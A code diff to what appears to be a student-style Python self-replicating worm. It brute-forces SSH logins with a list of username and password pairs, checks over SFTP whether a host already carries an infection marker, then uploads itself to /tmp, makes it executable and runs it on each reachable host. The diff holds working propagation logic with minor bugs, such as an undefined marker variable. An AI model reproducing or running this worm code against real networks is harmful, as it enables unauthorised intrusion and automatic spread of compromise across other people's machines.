@@ -7,7 +7,6 @@ import socket, fcntl, struct
 import netifaces
 
 markerLocation = "/tmp/marker.txt"
-wormMessageLocation = "/tmp/wormMessage.txt"
 
 wordList = [
 ('awesomeUserName', 'badPassword'),
@@ -47,22 +46,27 @@ def getHostsOnTheSameNetwork():
 
 
 # Find if the target has already been infected with our worm
-def isTargetInfected():
-	if os.path.exists(markerLocation):
-		return True
-	else:
-		return False
+def isTargetInfected(ssh):
 
+	infected = False
+	try:
+		sftpClient = ssh.open_sftp()
+		     
+		# Check if the file exists
+		sftpClient.stat(infectionMarker)
+	 
+		# The system is already infected
+		infected = True
+	except:
+		print("Target should be infected!!")
 
-def infectSystem():
-	fileObj = open(wormMessageLocation, "w")
-	fileObj.write("Dont forget to place witty remark here...")
-	fileObj.close()
+	return infected
+
 
 
 def markSystem():
 	marker = open(markerLocation, "w")
-	marker.write("This is marked!!!!")
+	marker.write("Dont forget to place witty remark here...")
 	marker.close()
 
 
@@ -120,9 +124,8 @@ def startAttacking(wormLocation, isHost):
 
 	if isHost:
 		print network
-		markSystem()
 
-	currIp = getMachineIp()
+	markSystem()
 
 	for Host in network:
 		
@@ -131,10 +134,8 @@ def startAttacking(wormLocation, isHost):
 		if isHost:
 			print("SSH Info: %s" %(str(sshInfo)))
 		
-		if sshInfo and currIp != Host:
+		if sshInfo and not isTargetInfected(sshInfo[0]):
 			
-			markSystem()
-			infectSystem()
 			sftpClient = sshInfo[0].open_sftp()
 			sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
 			sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
